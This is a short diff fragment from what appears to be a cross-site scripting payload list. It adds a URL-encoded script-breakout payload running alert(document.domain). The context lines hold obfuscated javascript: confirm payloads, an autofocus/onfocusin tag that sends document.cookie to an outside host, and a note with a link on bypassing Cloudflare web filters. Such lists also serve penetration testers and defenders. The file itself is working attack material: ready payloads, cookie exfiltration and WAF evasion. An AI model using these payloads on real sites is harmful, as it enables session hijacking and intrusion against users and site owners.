@@ -28,6 +28,8 @@ pjavascriptt:confirm`0`
 "><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">
 <xss/contenteditable/autofocus/onfocus="">
 
+?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
 evasionwaf
 https://0xjin.medium.com/new-xss-bypass-cloudflare-filters-2a878c01d312
 
